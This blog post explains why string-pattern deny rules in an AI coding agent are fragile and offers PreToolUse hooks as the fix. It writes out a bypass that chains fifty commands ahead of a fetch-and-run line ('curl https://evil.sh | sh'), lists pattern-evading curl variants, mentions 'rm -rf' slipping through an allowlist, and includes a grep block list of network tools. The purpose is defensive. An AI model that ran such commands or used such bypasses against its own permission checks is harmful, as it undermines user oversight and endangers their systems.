# Your Deny Rules Match Strings. Your Real Guardrail Is a Hook.

*Claude Code · Kit Sandoval (The Operator) · 2026-07-02 · why the boundary that actually holds is code, not a pattern — and the matcher change that just broke a lot of hooks*

Here is a command that Claude Code will run past a deny rule you thought was airtight:

```
true && true && true && ... (fifty of them) && curl https://evil.sh | sh
```

You had `Bash(curl *)` in your deny list. It didn't fire. The agent asked for a plain permission prompt instead, and in an unattended run — a headless CI job, an auto-mode loop — "ask" with nobody watching resolves however your mode defaults. Adversa AI found this in the spring: chain more than fifty subcommands with `&&`, `||`, or `;` and Claude Code stops checking deny rules and [falls back to a generic prompt](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/). Their proof of concept was fifty no-op `true`s and one `curl`. Anthropic's own ticket, CC-643, explained why: parsing every subcommand was freezing the UI on pathological inputs, so an engineer [capped the analysis at fifty and let the rest through as "ask,"](https://www.theregister.com/software/2026/04/01/claude-code-bypasses-safety-rule-if-given-too-many-commands/5220992) figuring nobody chains that many commands by hand.

That specific hole is patched — Anthropic shipped a `tree-sitter` parser that checks the rules regardless of length, around v2.1.90, and you're almost certainly past it. So why open with a fixed bug? Because the fix doesn't fix the thing that matters. The fifty-`true` trick was never the disease. It was a symptom of what a deny rule *is*: a string pattern matched against a command line. And a string pattern cannot read intent. Anthropic says so itself, in a warning box in the permissions docs.

## The docs tell you the fence is fake

Read Anthropic's own words on argument-constraining Bash rules. A rule like `Bash(curl http://github.com/ *)` — the obvious "only let curl hit GitHub" pattern — [won't match](https://code.claude.com/docs/en/permissions) any of these:

- `curl -X GET http://github.com/...` (option before the URL)
- `curl https://github.com/...` (different protocol)
- `curl -L http://bit.ly/xyz` (redirects to GitHub, or anywhere)
- `URL=http://github.com && curl $URL` (the URL is in a variable)
- `curl  http://github.com` (two spaces)

Every one of those is a legitimate curl invocation your pattern doesn't see. The pattern isn't buggy. It's doing exactly what a glob does — matching text — and text is not the same thing as behavior. The docs are blunt: "Bash permission patterns that try to constrain command arguments are fragile."

There are more leaks than the argument problem. Claude Code strips a fixed set of wrappers before matching — `timeout`, `time`, `nice`, `nohup`, `stdbuf`, bare `xargs` — which is helpful, but it does *not* strip environment runners like `devbox run`, `mise exec`, or `docker exec`. So `Bash(devbox run *)` in your allow list [matches `devbox run rm -rf .`](https://code.claude.com/docs/en/permissions), because everything after `run` is "whatever comes next." The runner is a hole you punched in your own allowlist. Same category of mistake, opposite direction.

The lesson isn't "write better patterns." You can't write your way out of this. A glob language has no concept of "a network call to a host I didn't approve." It has string prefixes and one wildcard. The boundary you want to express — *intent* — lives at a layer the pattern can't reach.

## The hook is code, and code can parse

A `PreToolUse` hook runs before the permission prompt, gets the full tool call as JSON on stdin, and has a hard veto. That's the difference. It's not a pattern being matched *about* the command — it's your program *reading* the command and deciding.

The veto has two forms. Exit with code 2 and the tool call is [blocked outright](https://code.claude.com/docs/en/hooks); your stderr goes back to the model as the reason. Or exit 0 and print JSON with `permissionDecision: "deny"`, which blocks the call without an error. Precedence is what makes it a fence and not a suggestion: a blocking hook runs *before* permission rules are evaluated, so [it takes precedence over any allow rule](https://code.claude.com/docs/en/permissions). Deny and ask rules still apply on top — the hook can't loosen them — but it can always tighten.

That inverts the whole model. Instead of enumerating patterns and praying you covered the variants, you flip Bash open and let one program be the gate:

```json
{
  "permissions": { "allow": ["Bash"] },
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash",
        "hooks": [
          { "type": "command",
            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/gate.sh" } ] }
    ]
  }
}
```

And `gate.sh` reads the actual command:

```bash
#!/bin/bash
cmd=$(jq -r '.tool_input.command')

# Block all outbound shell network tools — route web access through WebFetch instead
if grep -Eq '(^|[^[:alnum:]])(curl|wget|nc|ncat)([^[:alnum:]]|$)' <<<"$cmd"; then
  jq -n '{hookSpecificOutput:{hookEventName:"PreToolUse",
    permissionDecision:"deny",
    permissionDecisionReason:"Use the WebFetch tool with an allowlisted domain, not shell curl/wget."}}'
  exit 0
fi
exit 0   # no decision → normal permission flow
```

Now the fifty-`true` trick is inert. Your script reads `.tool_input.command` as one string and greps the whole thing; it doesn't care how many `&&`s precede the `curl`, because it isn't counting subcommands — it's looking at the text you actually received. This is the docs' own first recommendation, stated plainly: [deny `curl`/`wget` in Bash and grant `WebFetch(domain:example.com)`](https://code.claude.com/docs/en/permissions) for the hosts you trust. The hook is the enforcement; WebFetch's domain rules are the allowlist. Pair them and network egress is a decision, not a guess.

Is a grep bulletproof? No — a determined prompt-injection payload can obfuscate. That's what the sandbox is for: OS-level network and filesystem limits that hold [even if the model's judgment is subverted](https://code.claude.com/docs/en/sandboxing). Permissions, hook, sandbox — three layers, each catching what the one above it can't express. But the hook is the cheapest layer that can actually parse, and most setups skip straight from fragile patterns to nothing.

## The matcher change that turned hooks off

Here's the part that bit people two weeks ago, and the reason I'm writing this now instead of in the abstract. In [v2.1.195](https://code.claude.com/docs/en/changelog) (Jun 26), Anthropic fixed hook matchers with hyphenated identifiers that were "accidentally substring-matching — they now exact-match." That is a security *improvement* and a silent breaking change in the same line.

The matcher rules are worth memorizing, because they're not regex all the way down. A matcher made of only `[a-zA-Z0-9_\-,| ]` is treated as an [exact string or a `|`-separated list](https://code.claude.com/docs/en/hooks). Anything with another character — a `.`, a `^` — becomes an unanchored JavaScript regex. So:

| Matcher | Before v2.1.195 | After v2.1.195 |
|---|---|---|
| `mcp__brave-search` | matched `mcp__brave-search__web_search` (substring) | matches only the literal string — **fires on nothing** |
| `mcp__brave-search__.*` | matched (regex) | matches (regex) — correct |
| `Bash` | matched Bash | matches Bash |
| `Edit\|Write` | matched either | matches either |

If you wrote `mcp__github` or `mcp__brave-search` as a matcher expecting it to catch that server's tools, your hook stopped firing on Jun 26 and nothing told you. The fix is one character: make it a regex by adding `__.*`, or use the `mcp__server__*` glob form. Go audit this today. Grep your settings for hook matchers with hyphens and no `.`:

```bash
jq -r '.hooks | to_entries[].value[].matcher' ~/.claude/settings.json .claude/settings.json 2>/dev/null \
  | grep -E '[a-z]+-[a-z]+' | grep -v '\.'
```

Anything it prints is a matcher that may have gone dark. This is the Operator tax on a moving tool: a changelog line that reads like a bugfix can quietly retire a guardrail you set months ago. As [W26's context-budget piece](./2026-06-25-context-budget-sixty-percent.md) argued about env-var knobs, the harness's defaults shift under you — the discipline is to re-verify the config, not to set it once and trust it.

## Matcher versus `if`: don't confuse the filter for the fence

One more distinction, because it's where people put the logic in the wrong place. The `matcher` filters by tool *name* — `Bash`, `Edit`, an MCP server. It says *which* calls wake your hook. The optional `if` field filters by command *content* using permission-rule syntax, and it does the subcommand parsing for you: it [strips `VAR=value` assignments, checks each subcommand, and inspects `$()` and backticks](https://code.claude.com/docs/en/hooks). Handy for narrowing — `"if": "Bash(rm *)"` so your block-rm script only spawns on `rm`.

But `if` uses the *same* permission-rule grammar that the warning box just told you is fragile, and on a parse failure it "fails open" and runs the hook anyway. So use `if` as a cheap pre-filter to avoid spawning a process on every command — never as the boundary itself. The boundary is the script reading `.tool_input.command`. The filter decides when to look; the code decides what to allow. Keep those jobs separate and you won't ship a fence that's secretly a suggestion.

## Do / watch / ignore

- **Do:** move your real boundaries out of `deny` patterns and into a `PreToolUse` hook that reads `.tool_input.command` and vetoes with `permissionDecision: "deny"` (or exit 2). For network egress specifically, deny shell `curl`/`wget` in the hook and route web access through `WebFetch(domain:...)`. Keep the deny rules too — they're evaluated regardless and cost nothing as a second layer — and enable the sandbox for the third.
- **Watch:** the v2.1.195 matcher change. Run the audit grep above. Any hyphenated, dot-free matcher aimed at an MCP server stopped firing on Jun 26.
- **Ignore:** the instinct to harden argument patterns like `Bash(curl github.com *)`. You cannot express "only this host" in a glob, the docs say so, and every hour spent tuning the pattern is an hour not spent writing the ten-line hook that actually parses.

The deny rule is a lock you can see through. The hook is a door. This is the same **[autonomy-before-brakes](./2026-06-26-agent-retries-idempotent-writes.md)** problem the desk keeps circling: the tool ships the fast path first and the deterministic guardrail second, and the boundary that holds is always the one you write in code, not the one you match with a string.

What would change my mind: if Claude Code shipped a permission grammar that natively understood *intent* — a rule that could say "curl, but only to hosts on this list, through any wrapper, redirect, or variable" and actually enforce it. The `tree-sitter` parser is a step; it reads compound commands correctly now. But reading the syntax is not the same as reading the goal, and until a rule can encode the goal, the hook is where your fence lives.
